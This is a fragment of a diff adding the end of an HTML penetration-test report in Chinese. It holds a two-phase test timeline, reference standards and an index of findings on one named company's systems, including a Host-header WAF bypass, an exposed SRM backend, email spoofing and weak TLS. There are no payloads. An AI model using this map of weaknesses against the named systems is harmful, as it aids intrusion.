+<tr><td>04:45-05:30</td><td>验证</td><td>手动漏洞验证、Cisco CVE测试、WAF绕过尝试</td></tr>
+<tr><td>05:30-06:00</td><td>报告</td><td>报告编写 v1.0</td></tr>
+<tr><td colspan="3"><strong>Phase 2</strong></td></tr>
+<tr><td>06:00-06:15</td><td>侦察扩展</td><td>VPN全端口扫描、IKE/SNMP枚举、ebidding:8043分析</td></tr>
+<tr><td>06:15-06:30</td><td>WAF绕过</td><td>Host头操纵发现、SRM后端访问、API枚举</td></tr>
+<tr><td>06:30-06:45</td><td>邮件安全</td><td>DMARC/DKIM/SPF审计、邮件伪造PoC</td></tr>
+<tr><td>06:45-07:00</td><td>TLS审计</td><td>ebidding:8043 SSL/TLS密码套件枚举</td></tr>
+<tr><td>07:00-07:15</td><td>报告</td><td>4个新发现报告 + 主报告v2.0更新</td></tr>
+</table>
+
+<h2>C. 参考标准</h2>
+<p>OWASP Top 10 2024 | CWE Top 25 2024 | CVSS v3.1 | NIST SP 800-115 | PTES | RFC 8996 | RFC 7489 | NIST SP 800-52 Rev.2 | PCI DSS v4.0</p>
+
+<h2>D. 各发现详细报告 (findings/ 目录)</h2>
+<table>
+<tr><th>文件</th><th>SRC</th></tr>
+<tr><td><code>WHC-2026-001-cisco-self-signed-cert.md</code></td><td></td></tr>
+<tr><td><code>WHC-2026-002-cisco-webvpn-error.md</code></td><td></td></tr>
+<tr><td><code>WHC-2026-003-cisco-cve-2018-0296.md</code></td><td></td></tr>
+<tr><td><code>WHC-2026-004-waf-detection.md</code></td><td></td></tr>
+<tr><td><code>WHC-2026-005-infrastructure.md</code></td><td></td></tr>
+<tr><td><code>WHC-2026-006-bounty-hunter-addendum.md</code></td><td></td></tr>
+<tr style="background:#fff3e0;"><td><strong><code>WHC-2026-007-waf-bypass-host-header.md</code></strong></td><td><strong>可提交</strong></td></tr>
+<tr style="background:#fff3e0;"><td><strong><code>WHC-2026-008-srm-backend-port-disclosure.md</code></strong></td><td><strong>可提交</strong></td></tr>
+<tr style="background:#fff3e0;"><td><strong><code>WHC-2026-009-dmarc-email-spoofing.md</code></strong></td><td><strong>可提交</strong></td></tr>
+<tr style="background:#fff3e0;"><td><strong><code>WHC-2026-010-ebidding-weak-tls.md</code></strong></td><td><strong>可提交</strong></td></tr>
+</table>
+</div>
+
+</div>
+<div class="footer">
+  <p>本报告仅供万华化学集团授权的安全团队使用</p>
+  <p>文档版本 v2.0 | 2026-05-27 | 两阶段渗透测试</p>
+</div>
+</body>
+</html>
